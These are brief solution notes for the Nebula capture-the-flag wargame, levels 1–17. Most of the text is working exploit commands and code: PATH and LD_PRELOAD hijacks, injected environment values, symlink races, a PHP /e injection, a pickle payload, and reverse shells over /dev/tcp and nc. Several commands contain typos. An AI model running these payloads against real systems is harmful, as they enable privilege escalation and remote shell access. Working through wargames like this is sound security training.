## Level01
* PATH=/tmp/:$PATH
* create a echo.c in /tmp
```
echo.c
#include<stdio.h>
#include<stdlib.h>

int main(){
    system("/bin/bash");
}

cc echo.c -o echo
```

## Level02
* export USER=";/bin/bash;"

## Level03
* create a `exploit.c` file (just copy from level01) in `/tmp`
* write a `run.sh` in `/home/flag03/writable.d`
```
run.sh
cc /tmp/exploit.c -o /home/flag03/exploit
chmod +s /home/flag03/exploit
```

## Level04
* ln -s /home/flag04/token /tmp/exploit
* ./flag04 /tmp/exploit

## Level05
* tar -xvzf /home/flag05/.backup/backup-19072011.tgz -C /tmp
* cd /tmp && ssh -i .ssh/id_rsa flag05@localhost

## Level06
* in `/etc/passwd` there is `flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh`
* save to to a file `crack.txt`
* `john crack.txt --show`
* result: flag06:hello:993:993::/home/flag06:/bin/sh

## Level07
* cd /tmp && wget http://localhost:7007/index.cgi?Host=%3Bgetflag
* cat index.cgi?Host=;getflag 

## Level08
* read the `capture.pcap` file, follow the TCP stream
* as `7f` is `del` thus we can get the password is `backd00Rmate`

## Level09
* check the php version `php -v` is 5.3.6
* so `preg_replace` function still vulnerable to "Pattern Modifiers"
* create a `/tmp/exploit.txt`
```
/tmp/exploit.txt
[email {${system(sh)}}]
```
* `./flag05 /tmp/exploit.txt`

## Level10
* I just know that I can use ssh to connect to box using ssh
* TOCTOU (Time of check, Time of use) 
* so here we can using the `/home/flag10/flag10` to send a file to a server port `18211` 
* `flag10` will first check if the file is readable and later sent the file to server
* so we just need fast enough to switch the file fast enough
* `echo "wrong tokenâ€œ > /tmp/token`
* `while true; do ln -fs /tmp/token ~/token; ln -fs /home/flag10/token ~/token; done`
* `while true; do nc -lnp 18211; done` I did this on my local kali
* `while true; do /home/flag10/flag10 ~/token <ip>`

## Level11

## Level12
* hash function `io.popen` run shell
* `tenlet 127.0.0.1 50001`
* `Password: 1;bash -i >& /dev/tcp/[reverse ip]/[reverse port] 0>&1;echo 1`

## Level13
---
* gdb ./flag13
* break just before the cmp
* set $eax=0x3e8
* then we get token b705702b-76a8-42b0-8844-3adabbe5ac58

---
* create a fake uid file
```
fakeuid.c
#include <unistd.h>
#include <sys/types.h>

#define FAKEUID 1000
uid_t getuid(void){
    return FAKEUID;
}

gcc fakeuid.c -fPIC -shared -o ~/libfakeuid.so
export LD_PRELOAD="/home/level13/libfakeuid.so"
```
* run coped flag13 in `~` directory

## Level14
* decrypt from token
* `8457c118-887c-4e40-a5a6-33a25353165`
* just try the `./flag14 -e` and recognize the difference between input and output(the ord difference)
* then `su flag14` and input that decrypted token

## Level15
* `strace /home/flag15/flag15`
* this is a libc.so.6 inject
* shell.c
```
#include <linux/unistd.h>


void __cxa_finalize (void *d) {  
    return;
}

int __libc_start_main(int (*main) (int, char **, char **), int argc, char *argv, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void *stack_end) {  
  system("/bin/sh");
}
```
* version
`GLIBC_2.0 { };`

* `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic -o libc.so.6 shell.c`


## Level16
* egrep injection(https://www.aldeid.com/wiki/WackoPicko/Command-Line-Injection)
* so we need inject the username

* here are some problems, as it is netcat-openbsd version so reverseshell `nc -e /bin/sh 127.0.0.1 9999` not work(and I still haven't find the solution)
* so reverse shell

* `echo "/bin/getflag > /tmp/bar" > /tmp/SHELL`
* `chmod +x /tmp/SHELL`
* x = urlencode ``/*/SHELL``

* `curl http://<ip>:1616/index.cgi?username=$x&password=foo`(curl is not installed on nebula)

## Level17
* this is `pickle.loads` injection
* `cat /tmp/foo`
```
cos
system
(S'getflag > /tmp/flag17'
tR.
```
* `nc localhost 10007 < foo`

```
exploit.py

import os
import socket

HOST = "192.168.0.192"
PORT = 10007

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
s.connect((HOST, PORT))
payload = "cos\nsystem\n(S'getflag > /tmp/flag17'\ntR."
s.send(payload)
```